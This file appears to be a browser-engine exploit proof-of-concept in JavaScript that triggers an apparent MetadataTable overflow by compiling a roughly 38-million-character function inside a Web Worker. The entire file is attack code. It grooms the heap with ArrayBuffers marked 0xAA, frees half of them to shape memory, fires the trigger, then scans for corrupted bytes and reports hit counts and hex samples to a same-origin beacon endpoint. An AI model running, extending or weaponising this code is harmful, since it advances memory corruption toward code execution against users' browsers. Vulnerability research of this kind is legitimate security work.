// p163 — MetadataTable overflow via Worker call (crash-isolated)
// Worker compiles and calls the 38M function → finishCreation OOB sweep
// Worker may crash but main thread survives to scan spray
// Spray filled with 0xAA to detect any modification
// Beacon prefix: V163-
(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V163-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var BUF_SZ = 100112;
  var TOTAL = 600;
  var bufs = new Array(TOTAL);
  var views = [];

  for (var i = 0; i < TOTAL; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY-' + TOTAL);

  for (var i = 1; i < TOTAL; i += 2) {
    var v = new Uint8Array(bufs[i]);
    for (var j = 0; j < BUF_SZ; j++) v[j] = 0xAA;
    views.push(v);
  }
  B('MARKED-' + views.length);

  var freed = 0;
  for (var i = 0; i < TOTAL; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      freed++;
    } catch(e) {}
    bufs[i] = null;
  }
  bufs = null;
  B('FREED-' + freed);

  setTimeout(function() {
    for (var g = 0; g < 30; g++) {
      var junk = [];
      for (var j = 0; j < 100000; j++) junk.push({x: j, y: j * 2});
      junk = null;
    }
    B('GC-DONE');

    // Build 38M function source
    var src = 'self.__p163fn=function(a){';
    var chunk = 'a();a();a();a();a();a();a();a();a();a();';
    var big = '';
    for (var k = 0; k < 1000; k++) big += chunk;
    var parts = [src];
    for (var k = 0; k < 3834; k++) parts.push(big);
    var rem = 38348816 - 38340000;
    var remStr = '';
    for (var k = 0; k < rem; k++) remStr += 'a();';
    parts.push(remStr);
    parts.push('};self.postMessage("COMPILED");');

    var fnBlob = new Blob(parts, {type: 'application/javascript'});
    B('FNBLOB-' + Math.round(fnBlob.size / 1048576) + 'MB');
    parts = null; big = null;
    var fnUrl = URL.createObjectURL(fnBlob);

    // Worker code: load the function, then call it
    var wCode = [
      'importScripts("' + fnUrl + '");',
      'self.postMessage("CALLING");',
      'var t0 = Date.now();',
      'try {',
      '  self.__p163fn(function() { throw "V163STOP"; });',
      '} catch(e) {',
      '  self.postMessage("SURVIVED-" + (Date.now() - t0) + "ms");',
      '}',
      'self.postMessage("DONE");'
    ].join('\n');

    var wBlob = new Blob([wCode], {type: 'application/javascript'});
    var wUrl = URL.createObjectURL(wBlob);

    B('WORKER-LAUNCH');
    var w = new Worker(wUrl);
    var workerDead = false;
    var workerMsgs = [];

    w.onmessage = function(e) {
      workerMsgs.push(String(e.data));
      B('WMSG-' + String(e.data).substring(0, 40));
    };

    w.onerror = function(e) {
      workerDead = true;
      B('WERR-' + (e.message || 'unknown').substring(0, 40));
    };

    // Wait for Worker to finish (succeed or crash), then scan
    var checkCount = 0;
    var checkInterval = setInterval(function() {
      checkCount++;

      var compiled = workerMsgs.indexOf('COMPILED') >= 0;
      var calling = workerMsgs.indexOf('CALLING') >= 0;
      var survived = false;
      for (var m = 0; m < workerMsgs.length; m++) {
        if (workerMsgs[m].indexOf('SURVIVED') === 0) survived = true;
      }
      var done = workerMsgs.indexOf('DONE') >= 0;

      // Scan after Worker is done, crashed, or timed out
      if (done || workerDead || survived || checkCount > 60) {
        clearInterval(checkInterval);
        B('WSTATUS-C' + (compiled?1:0) + '-K' + (calling?1:0) + '-S' + (survived?1:0) + '-D' + (done?1:0) + '-E' + (workerDead?1:0));

        // Scan spray
        var hit = 0;
        var totalChanged = 0;
        var firstDetail = '';
        for (var i = 0; i < views.length; i++) {
          var v = views[i];
          var changed = 0;
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== 0xAA) changed++;
          }
          if (changed > 0) {
            hit++;
            totalChanged += changed;
            if (firstDetail.length < 80) {
              firstDetail += 'V' + i + ':' + changed + ' ';
            }
          }
        }

        if (hit > 0) {
          B('HIT-' + hit + '-OF-' + views.length + '-CHG-' + totalChanged);
          if (firstDetail) B('DETAIL-' + firstDetail.trim());
          // Sample first corrupted bytes
          for (var i = 0; i < views.length; i++) {
            var v = views[i];
            for (var j = 0; j < v.length; j++) {
              if (v[j] !== 0xAA) {
                var sample = '';
                for (var s = j; s < j + 32 && s < v.length; s++) {
                  var h = v[s].toString(16);
                  if (h.length < 2) h = '0' + h;
                  sample += h;
                }
                B('SAMPLE-V' + i + '-OFF' + j + '-' + sample);
                i = views.length;
                break;
              }
            }
          }
        } else {
          B('MISS-' + views.length + '-ANYMOD-NO');
        }
        B('DONE');
      }
    }, 500);
  }, 500);
})();
